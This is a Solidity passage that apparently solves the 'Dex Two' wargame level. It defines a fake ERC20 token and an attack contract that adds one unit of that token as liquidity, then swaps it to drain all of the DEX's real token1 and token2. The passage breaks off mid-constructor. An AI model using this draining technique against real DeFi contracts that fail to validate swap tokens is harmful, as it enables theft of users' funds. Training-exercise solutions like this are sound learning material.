...
contract HackToken is ERC20 {
    constructor(uint amount) public ERC20("Dex Two Hack Token", "DTHT") {
        _mint(msg.sender, amount);
    }
}

contract DexTwoHack {
    constructor(DexTwo dex) public {
        address owner = msg.sender;
        ERC20 token1 = ERC20(dex.token1());
        ERC20 token2 = ERC20(dex.token2());

        ERC20 ht = new HackToken(4);
        ht.approve(address(dex), type(uint).max);

        ht.transfer(address(dex), 1); // add liquidity
        // liquidity: 1 ht = all other token
        dex.swap(address(ht), address(token1), 1); // get all token1
        // liquidity: 2 ht = all other token
        dex.swap(address(ht), address(token2), 2); // get all token2
